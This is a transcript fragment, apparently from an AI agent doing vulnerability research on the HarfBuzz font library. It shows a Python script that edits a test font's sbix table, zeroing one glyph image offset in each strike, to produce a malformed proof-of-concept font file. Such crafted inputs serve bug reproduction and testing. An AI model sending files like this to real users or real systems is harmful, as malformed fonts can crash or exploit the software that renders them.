Running command: cd /workspace/repo-vul/src-vul/harfbuzz && python3 - <<'PY'
import struct, shutil
src='test/subset/data/fonts/sbix.ttf'
dst='/workspace/poc-sbix-null-glyph1.ttf'
data=bytearray(open(src,'rb').read())
num=struct.unpack('>H', data[4:6])[0]
tables={}
for i in range(num):
    off=12+16*i
    tag=data[off:off+4].decode('latin1')
    check, offset, length=struct.unpack('>III', data[off+4:off+16])
    tables[tag]=(offset,length,off)
sbix_off,sbix_len,_=tables['sbix']
version,flags,count=struct.unpack('>HHI', data[sbix_off:sbix_off+8])
strikes=struct.unpack('>'+'I'*count, data[sbix_off+8:sbix_off+8+4*count])
for so in strikes:
    st=sbix_off+so
    # set imageOffsetsZ[1] to zero; keep imageOffsetsZ[2] as valid positive length
    data[st+4+4:st+4+8]=struct.pack('>I',0)
open(dst,'wb').write(data)
print(dst, len(data), count, strikes[:3])
for so in strikes[:3]:
    st=sbix_off+so
    print(so, data[st:st+20].hex())
